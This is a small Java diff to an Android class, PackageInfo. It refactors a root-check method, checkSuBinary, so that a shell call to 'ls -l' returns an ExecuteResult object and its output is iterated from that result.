@@ -28,6 +28,7 @@ import com.android.networking.conf.Configuration;
 import com.android.networking.file.AutoFile;
 import com.android.networking.util.Check;
 import com.android.networking.util.Execute;
+import com.android.networking.util.ExecuteResult;
 
 public class PackageInfo {
 	private static final String TAG = "PackageInfo";
@@ -182,8 +183,8 @@ public class PackageInfo {
 	// Non dovrebbe servire usarla
 	private static boolean checkSuBinary() {
 		Execute exec = new Execute();
-		ArrayList<String> output = exec.execute("ls -l");
-		Iterator<String> i = output.iterator();
+		ExecuteResult ret = exec.execute("ls -l");
+		Iterator<String> i = (Iterator<String>) ret.stdout;
 
 		if (i == null) {
 			return false;
